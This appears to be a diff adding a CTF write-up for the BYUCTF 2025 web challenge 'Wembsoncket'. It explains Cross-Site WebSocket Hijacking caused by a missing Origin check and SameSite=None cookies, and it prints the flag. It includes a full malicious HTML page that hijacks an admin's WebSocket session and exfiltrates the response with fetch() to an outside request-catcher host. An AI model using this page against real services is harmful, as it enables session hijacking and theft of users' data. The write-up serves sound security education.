@@ -1,0 +1,116 @@
+---
+title: "Wembsoncket — BYUCTF 2025"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "byuctf-2025-wembsoncket"
+order: 281
+writeupKind: "challenge"
+ctfSlug: "byuctf-2025"
+ctfTitle: "BYUCTF 2025"
+---
+
+# Wembsoncket — BYUCTF 2025
+
+> **Category:** `Web Exploitation`  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `byuctf{CSWSH_1s_a_b1g_acr0nym}`  
+> **Source Path:** `web/wembsoncket`
+
+---
+
+## Challenge Description
+
+```text
+WebSockets are relatively new, so they must be secure, right?
+
+https://wembsoncket.chal.cyberjousting.com
+
+[wembsoncket.zip]
+```
+
+---
+
+## Provided Materials
+
+- [Repository folder](https://github.com/BYU-CSA/BYUCTF-2025/tree/main/web/wembsoncket)
+- [web/wembsoncket/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/web/wembsoncket/README.md)
+- [web/wembsoncket/secret.txt](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/web/wembsoncket/secret.txt)
+- [web/wembsoncket/wembsoncket.zip](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/web/wembsoncket/wembsoncket.zip)
+- [web/wembsoncket/solve.html](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/web/wembsoncket/solve.html)
+
+---
+
+## Recon / Initial Analysis
+
+This page imports the BYUCTF 2025 source material for the Web Exploitation challenge **Wembsoncket**. The prompt is kept separate from the solve notes, and upstream artifacts are linked so the challenge can be replayed from the original repository.
+
+---
+
+## Vulnerability / Observation
+
+The useful observation comes from the imported solve notes below. I kept the original technical path intact while normalizing the page metadata, challenge grouping, and author attribution for the Volume 2 writeup archive.
+
+---
+
+## Exploitation / Solution
+
+Source: [web/wembsoncket/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/web/wembsoncket/README.md)
+
+The vulnerability in this application is caused by Cross-Site WebSocket Hijacking (CSWSH). In this case, an admin user can request the flag by sending a `/getFlag` message over the WebSocket connection. The application does not properly validate the origin header during the WebSocket handshake (which is the default behavior of WebSockets for some reason) and uses authentication cookies that have the SameSite=None flag, allowing them to be sent cross-origin.
+
+An attacker can exploit this by crafting a malicious webpage that the admin is tricked into visiting. In most browsers, cookies will automatically be sent with the WebSocket handshake if they exist. When the admin visits the malicious page, which establishes a WebSocket connection to the server, the admin's cookie will be sent. Since WebSockets are not bound by the Same-Origin Policy (SOP), the WebSocket connection can come from any origin. WebSockets rely on the developer to check the origin header, which means this vulnerability can actually be found in production quite often. 
+
+The attacker needs to create a malicious page that establishes a WebSocket connection, sends the `/getFlag` message, receives the response, and exfiltrates the flag through a GET request, for example. Since there is no SOP, the malicious page can be hosted anywhere that the admin bot can access (ngrok works great). An example malicious page is included in `solve.html`.
+
+**Flag** - `byuctf{CSWSH_1s_a_b1g_acr0nym}`
+
+---
+
+## Full Exploit Script
+
+Source: [web/wembsoncket/solve.html](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/web/wembsoncket/solve.html)
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Malicious Page</h1>
+    <p>This page will try to trigger the `getFlag` command and exfiltrate the flag via a GET request.</p>
+
+    <script>
+        // WebSocket connection to the admin's WebSocket server
+        const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+
+        // When the WebSocket is open, send the "getFlag" message
+        ws.onopen = function() {
+            const message = JSON.stringify({message: "/getFlag"});  // The payload you want to send to the admin WebSocket server
+            ws.send(message);
+        };
+
+        // When the WebSocket receives a message (presumably the flag)
+        ws.onmessage = function(event) {
+            // Exfiltrate the flag via a GET request
+            fetch('https://bingus.requestcatcher.com/?flag='+event.data);
+        };
+
+        // Log any errors or received messages
+        ws.onerror = function(error) {
+            console.log('WebSocket Error: ', error);
+        };
+    </script>
+</body>
+</html>
+```
+
+---
+
+## Key Takeaways
+
+- The BYUCTF 2025 challenge material is preserved with local archive formatting.
+- The page author is normalized to Imattas aka Zemi.
+- The source repository remains linked for handouts, services, and solve artifacts.
